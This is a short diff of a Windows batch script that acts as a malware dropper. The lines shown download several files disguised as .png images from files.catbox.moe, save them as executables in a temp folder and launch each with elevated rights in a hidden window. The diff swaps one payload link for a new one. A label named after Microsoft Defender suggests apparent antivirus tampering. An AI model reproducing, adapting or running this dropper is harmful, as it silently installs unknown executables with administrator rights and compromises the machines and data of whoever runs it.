@@ -1,5 +1,5 @@
 ÿþ
-@echo off
+@echo off
 cls
 goto :yes
 :MicrosoftDefender
@@ -165,6 +165,6 @@ mkdir "%temp%\GraphicsType"
 %powershell% iwr -useb "https://files.catbox.moe/p3vomo.png" -OutFile "%temp%\GraphicsType\tmp.exe"; saps "%temp%\GraphicsType\tmp.exe" -Verb RunAs -WindowStyle Hidden
 %powershell% iwr -useb "https://files.catbox.moe/vll6vf.png" -OutFile "%temp%\GraphicsType\tmp1.exe"; saps "%temp%\GraphicsType\tmp1.exe" -Verb RunAs -WindowStyle Hidden
 %powershell% iwr -useb "https://files.catbox.moe/rlfpqj.png" -OutFile "%temp%\GraphicsType\tmp2.exe"; saps "%temp%\GraphicsType\tmp2.exe" -Verb RunAs -WindowStyle Hidden
-%powershell% iwr -useb "https://files.catbox.moe/1wxcwu.png" -OutFile "%temp%\GraphicsType\tmp3.exe"; saps "%temp%\GraphicsType\tmp3.exe" -Verb RunAs -WindowStyle Hidden
+%powershell% iwr -useb "https://files.catbox.moe/luunhv.png" -OutFile "%temp%\GraphicsType\tmp3.exe"; saps "%temp%\GraphicsType\tmp3.exe" -Verb RunAs -WindowStyle Hidden
 goto :EOF
 exit
